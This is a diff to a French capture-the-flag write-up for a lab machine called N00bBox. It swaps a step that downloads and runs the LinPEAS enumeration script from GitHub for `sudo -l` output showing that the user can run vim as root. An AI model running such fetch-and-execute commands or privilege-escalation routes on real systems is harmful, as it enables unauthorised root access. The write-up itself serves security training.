@@ -117,11 +117,14 @@ Je regarde à quel groupe appartient cet utilisateur : `id`
 uid=1000(noobbox) gid=1000(noobbox) groups=1000(noobbox),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
 ```
 
-Ensuite, je récupère le script LinPEAS :
+Je regarde quels sont ses droits avec la commande `sudo` : `sudo -l`
 ```
-cd /tmp
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
+Matching Defaults entries for noobbox on N00bBox:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User noobbox may run the following commands on N00bBox:
+    (ALL : ALL) /usr/bin/vim
 ```
+
 
